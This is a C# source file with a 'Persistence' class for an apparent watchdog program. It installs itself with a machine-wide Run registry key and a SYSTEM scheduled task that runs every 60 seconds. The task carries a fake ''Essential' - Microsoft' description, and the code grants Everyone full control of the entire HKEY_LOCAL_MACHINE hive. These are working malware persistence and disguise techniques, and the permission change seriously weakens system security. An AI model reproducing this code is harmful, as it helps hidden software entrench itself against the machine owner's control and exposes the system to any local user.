using Microsoft.Win32;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32.TaskScheduler;


    public class Persistence
    {

        public static void runAllTechniques()
        {
            GrantEveryoneFullControl(Registry.LocalMachine); //grants all users full control over reg keys
   
            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\Run", Config.RunKeyName, Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
          



            // Check if the task exists
            if (!TaskExistsAndActive(Config.ScheduledTaskName))
            {
                // Create or re-enable the task if it doesn't exist or is inactive
                CreateScheduledTask(Config.ScheduledTaskName, Config.PrimaryWatchdogFullPath); // Runs every minute
                watchdogHelper.Log($"Scheduled task '{Config.ScheduledTaskName}' created or re-enabled successfully.");
            }
            else
            {
                watchdogHelper.Log($"Scheduled task '{Config.ScheduledTaskName}' already exists and is active.");

            }

        }

    private static bool TaskExistsAndActive(string taskName)
    {
        try
        {
            using (TaskService ts = new TaskService())
            {
                Microsoft.Win32.TaskScheduler.Task? task = ts.GetTask(taskName);
                if (task != null && task.State == TaskState.Ready)
                {
                    return true;
                }
                else
                {
                    ts.RootFolder.DeleteTask(taskName); // delete disabled task if it exists
                    return false;
                }
            }
        }
        catch (Exception ex)
        {
            watchdogHelper.Log($"Error verifying task exists and active: {ex.Message}");
            return false;
        }
    }

        private static void CreateScheduledTask(string taskName, string binaryPath)
        {
        try
        {
            using (TaskService ts = new TaskService())
            {
                TaskDefinition td = ts.NewTask();
                td.RegistrationInfo.Description = "\"Essential\" - Microsoft";
                td.Principal.LogonType = TaskLogonType.ServiceAccount;
                td.Principal.UserId = "SYSTEM";

                // Set the trigger to run every 60 seconds
                TimeTrigger trigger = new TimeTrigger
                {
                    StartBoundary = DateTime.Now,
                    Repetition = new RepetitionPattern(TimeSpan.FromSeconds(60), TimeSpan.Zero) // Duration set to zero for indefinite repetition
                };
                td.Triggers.Add(trigger);

                // Set the action to run the binary
                td.Actions.Add(new ExecAction(binaryPath));

                // Register the task
                ts.RootFolder.RegisterTaskDefinition(taskName, td, TaskCreation.CreateOrUpdate, "SYSTEM", null, TaskLogonType.ServiceAccount);
            }
        }
        catch (Exception ex)
        {
            watchdogHelper.Log($"Error creating scheduled task: {ex.Message}");
        }
    }


    private static void SetRegistryKey(string keyPath, string valueName, object value, RegistryHive hive, RegistryView view = RegistryView.Default)
        {
            try
            {
                using (RegistryKey baseKey = RegistryKey.OpenBaseKey(hive, view))
                {
                    using (RegistryKey key = baseKey.OpenSubKey(keyPath, true) ?? baseKey.CreateSubKey(keyPath, true))
                    {
                        if (key != null)
                        {
                            object ?currentValue = key.GetValue(valueName);
                            if (currentValue == null || !currentValue.Equals(value))
                            {
                                key.SetValue(valueName, value); //sets registry key
                            }
                        }
                        else
                        {
                            throw new IOException($"Failed to create or open registry key: {keyPath}");
                        }
                    }
                }
            }
            catch (UnauthorizedAccessException ex)
            {
                watchdogHelper.Log($"Access denied to registry key: {keyPath}. Exception: {ex.Message}");
            }
            catch (IOException ex)
            {
                watchdogHelper.Log($"I/O error accessing registry key: {keyPath}. Exception: {ex.Message}");
            }
            catch (Exception ex)
            {
                watchdogHelper.Log($"Unexpected error: {ex.Message}");
            }
        }

        

        private static void GrantEveryoneFullControl(RegistryKey rootKey)
        {
            try
            {
                // Get the current access control for the key
                RegistrySecurity registrySecurity = rootKey.GetAccessControl();

                // Create a new rule that grants "Everyone" Full Control
                RegistryAccessRule rule = new RegistryAccessRule(
                    new SecurityIdentifier(WellKnownSidType.WorldSid, null), // "Everyone" group
                    RegistryRights.FullControl,                               // Full control
                    InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, // Inherit permissions
                    PropagationFlags.None,                                    // Don't propagate further
                    AccessControlType.Allow                                   // Allow the rule
                );

                // Add the rule to the security object
                registrySecurity.AddAccessRule(rule);

                // Enable inheritance for subkeys
                registrySecurity.SetAccessRuleProtection(false, false);

                // Apply the modified security settings to the key
                rootKey.SetAccessControl(registrySecurity);

                watchdogHelper.Log($"Successfully granted 'Everyone' full control and enabled inheritance on {rootKey}.");
            }
            catch (UnauthorizedAccessException ex)
            {
                watchdogHelper.Log($"Error: Access denied. Run the application with administrator privileges. Error: {ex.Message}");
            }
            catch (ArgumentException ex)
            {
                watchdogHelper.Log($"Error: {ex.Message}");
            }
            catch (Exception ex)
            {
                watchdogHelper.Log($"An error occurred: {ex.Message}");
            }
        }
    }
